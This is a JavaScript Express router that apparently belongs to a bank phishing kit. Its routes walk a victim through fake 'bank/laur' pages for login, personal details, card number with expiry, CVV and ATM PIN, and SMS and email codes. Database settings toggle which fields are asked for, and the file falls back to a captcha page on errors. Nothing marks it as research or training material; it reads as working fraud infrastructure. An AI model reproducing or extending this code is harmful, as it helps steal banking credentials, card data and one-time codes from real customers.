// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/finish', async (req, res) => {
    res.render('bank/laur/finish/index');
})

router.get('/card', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        res.render('bank/laur/card/index', { navig: "/laur/finish", laur: result.rows[0].data.settings.laur});

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/loading', async (req, res) => {
    res.render('bank/laur/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/laur/sms/index', { navig: "/laur/loading", error: error});
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/laur/email/index', { navig: "/laur/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.laur).forEach(key => {
            if (result.rows[0].data.settings.laur[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/laur/details/index', { navig: "/laur/finish", laur: result.rows[0].data.settings.laur});
        } else {
            res.render('bank/laur/details/index', { navig: "/laur/card", laur: result.rows[0].data.settings.laur});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})


router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.laur).forEach(key => {
            if (result.rows[0].data.settings.laur[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (count >= 14) {
            res.render('bank/laur/login/index', { navig: "/laur/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/laur/login/index', { navig: "/laur/finish" });
                } else {
                    res.render('bank/laur/login/index', { navig: "/laur/card" });
                }
            } else {
                res.render('bank/laur/login/index', { navig: "/laur/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
